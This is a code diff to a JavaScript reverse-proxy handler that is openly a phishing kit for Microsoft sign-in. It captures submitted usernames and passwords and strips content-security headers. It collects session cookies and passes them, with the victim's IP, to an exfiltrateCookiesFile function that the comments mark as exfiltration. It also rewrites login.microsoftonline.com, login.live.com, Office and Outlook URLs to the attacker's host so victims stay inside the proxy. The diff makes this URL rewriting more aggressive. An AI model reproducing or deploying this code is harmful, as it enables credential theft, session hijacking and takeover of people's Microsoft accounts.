@@ -71,12 +71,8 @@ async function handleProxy(request, pathSegments = []) {
 
       for (const pair of keyValuePairs) {
         const [key, value] = pair.split('=');
-        if (key === 'login' && value) {
-          user = decodeURIComponent(value.replace(/\+/g, ' '));
-        }
-        if (key === 'passwd' && value) {
-          pass = decodeURIComponent(value.replace(/\+/g, ' '));
-        }
+        if (key === 'login' && value) user = decodeURIComponent(value.replace(/\+/g, ' '));
+        if (key === 'passwd' && value) pass = decodeURIComponent(value.replace(/\+/g, ' '));
       }
 
       if (user && pass) {
@@ -87,13 +83,9 @@ async function handleProxy(request, pathSegments = []) {
     }
   }
 
-  // ==================== MAIN FETCH ====================
+  // Main fetch
   try {
-    const fetchOptions = {
-      method: method,
-      headers: new_request_headers,
-    };
-
+    const fetchOptions = { method, headers: new_request_headers };
     if (!["GET", "HEAD"].includes(method)) {
       fetchOptions.body = request.body;
       fetchOptions.duplex = 'half';
@@ -101,7 +93,6 @@ async function handleProxy(request, pathSegments = []) {
 
     let original_response = await fetch(upstreamUrl.toString(), fetchOptions);
 
-    // WebSocket passthrough
     const connection_upgrade = new_request_headers.get("Upgrade");
     if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
       return original_response;
@@ -117,7 +108,7 @@ async function handleProxy(request, pathSegments = []) {
     new_response_headers.delete('content-security-policy-report-only');
     new_response_headers.delete('clear-site-data');
 
-    // Cookie handling + exfil (including ESTSAUTHLIGHT)
+    // Cookie handling + exfil
     let all_cookies = "";
     try {
       const originalCookies = (typeof new_response_headers.getAll === "function")
@@ -141,34 +132,42 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // ==================== AGGRESSIVE BODY REWRITING ====================
+    // ==================== STRONG URL REWRITING (inspired by the Worker) ====================
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
     if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
       let text = await original_response_clone.text();
 
-      // Aggressive Microsoft URL rewriting
-      text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
-      text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
+      // Core replacements (like the Worker)
       text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
 
-      // Additional Microsoft domains
+      // More aggressive replacements
+      text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
+      text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
+
       text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
-      text = text.replace(/https?:\/\/office365\.com/g, `https://${url_hostname}`);
+      text = text.replace(/https?:\/\/aadcdn\.msftauth\.net/g, `https://${url_hostname}`);
 
-      // Fix absolute paths starting with /common, /api, etc.
-      text = text.replace(/(["'])(\/common\/|\/api\/|\/Prefetch\.aspx|\/GetCredentialType|\/graphql|\/ajax|\/sso)/g, 
-        `$1https://${url_hostname}$2`);
+      // Fix absolute paths that cause localhost issues
+      // This is the most important part for /common/GetCredentialType, /Me.htm, etc.
+      text = text.replace(
+        /(["'])(\/common\/|\/api\/|\/Prefetch\.aspx|\/GetCredentialType|\/Me\.htm|\/sso|\/ajax|\/graphql)/g,
+        `$1https://${url_hostname}$2`
+      );
+
+      // Extra safety: replace any remaining bare /common/ or /api/ that might be relative
+      text = text.replace(/(["'])(\/common\/[^"']*)/g, `$1https://${url_hostname}$2`);
+      text = text.replace(/(["'])(\/api\/[^"']*)/g, `$1https://${url_hostname}$2`);
 
       original_text = text;
     } else {
       original_text = original_response_clone.body;
     }
-    // =================================================================
+    // ====================================================================================
 
     return new Response(original_text, {
       status,
